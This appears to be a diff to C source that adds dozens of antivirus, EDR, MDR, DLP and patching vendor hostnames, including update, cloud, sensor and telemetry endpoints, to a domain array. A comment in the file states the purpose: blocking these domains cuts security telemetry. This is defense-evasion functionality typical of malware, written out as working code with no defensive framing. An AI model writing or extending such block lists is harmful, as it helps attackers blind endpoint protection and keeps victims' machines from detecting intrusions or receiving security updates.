@@ -292,6 +292,69 @@ static const char* s_domains[]={
     // Splunk (SIEM — collects AV/EDR alerts; blocking cuts telemetry pipelines)
     "splunk.com","www.splunk.com","cloud.splunk.com",
     "inputs.cloud.splunk.com","api.splunk.com","splunkcloud.com",
+    // Zemana AntiMalware
+    "zemana.com","www.zemana.com","cloud.zemana.com","update.zemana.com",
+    // Gridinsoft Anti-Malware
+    "gridinsoft.com","www.gridinsoft.com","update.gridinsoft.com",
+    // TotalAV
+    "totalav.com","www.totalav.com","update.totalav.com","cdn.totalav.com",
+    // Fortect (PC repair / AV)
+    "fortect.com","www.fortect.com","update.fortect.com",
+    // EnigmaSoft / SpyHunter
+    "enigmasoftware.com","www.enigmasoftware.com","spyhunter.com","update.spyhunter.com",
+    // ALYac / ESTsecurity (South Korea)
+    "estsecurity.com","www.estsecurity.com","alyac.alyac.com","alyac.com",
+    "update.alyac.com","engine.alyac.com",
+    // Bkav (Vietnam)
+    "bkav.com","www.bkav.com","update.bkav.com","bkav.net","cloud.bkav.com",
+    // Smadav (Indonesia)
+    "smadav.net","www.smadav.net","update.smadav.net",
+    // Sangfor Endpoint Security (China enterprise)
+    "sangfor.com","www.sangfor.com","ep.sangfor.com","cloud.sangfor.com","edr.sangfor.com",
+    // Qi-Anxin / Legendsec Tianqing (China enterprise)
+    "qianxin.com","www.qianxin.com","qi-anxin.com","tianqing.qianxin.com","edr.qianxin.com",
+    // Baidu Antivirus extra (duba.net already in Kingsoft block)
+    "antivirus.baidu.com","safe.baidu.com","virus.baidu.com",
+    // FFRI Yarai (Japan EDR)
+    "ffri.jp","www.ffri.jp","yarai.ffri.jp",
+    // Arctic Wolf (MDR)
+    "arcticwolf.com","www.arcticwolf.com","cloud.arcticwolf.com","sensor.arcticwolf.com",
+    // Red Canary (MDR)
+    "redcanary.com","www.redcanary.com","api.redcanary.com",
+    // Forcepoint (enterprise DLP / endpoint)
+    "forcepoint.com","www.forcepoint.com","update.forcepoint.com",
+    "sensor.forcepoint.com","forcepoint.net",
+    // ManageEngine / Zoho endpoint (Endpoint Central / Desktop Central)
+    "manageengine.com","www.manageengine.com","patch.manageengine.com",
+    "desktopcentral.manageengine.com","me.zoho.com",
+    // HarfangLab (France EDR)
+    "harfanglab.io","www.harfanglab.io","app.harfanglab.io","api.harfanglab.io",
+    // Genians (South Korea NAC/EDR)
+    "genians.com","www.genians.com","cloud.genians.com",
+    // Fidelis Cybersecurity
+    "fidelissecurity.com","www.fidelissecurity.com","cloud.fidelissecurity.com",
+    // SenseOn (UK EDR/XDR)
+    "senseon.io","www.senseon.io","api.senseon.io",
+    // SpyShelter (HIPS)
+    "spyshelter.com","www.spyshelter.com","update.spyshelter.com",
+    // VoodooShield / CyberLock (auto-HIPS)
+    "voodooshield.com","www.voodooshield.com","cyberlock.io",
+    // AppGuard (application control)
+    "appguard.us","www.appguard.us",
+    // SecureAPlus (application whitelist + cloud AV)
+    "secureaplus.com","www.secureaplus.com","cloud.secureaplus.com",
+    // 0patch (live micropatching)
+    "0patch.com","www.0patch.com","console.0patch.com",
+    // Surfshark Antivirus
+    "surfshark.com","www.surfshark.com","api.surfshark.com",
+    // TrustPort (Czech AV)
+    "trustport.com","www.trustport.com","update.trustport.com",
+    // PSafe (Brazil)
+    "psafe.com","www.psafe.com","api.psafe.com",
+    // UnThreat
+    "unthreat.com","www.unthreat.com","update.unthreat.com",
+    // Velociraptor DFIR agent
+    "velociraptor.app","www.velociraptor.app",
     NULL
 };
 
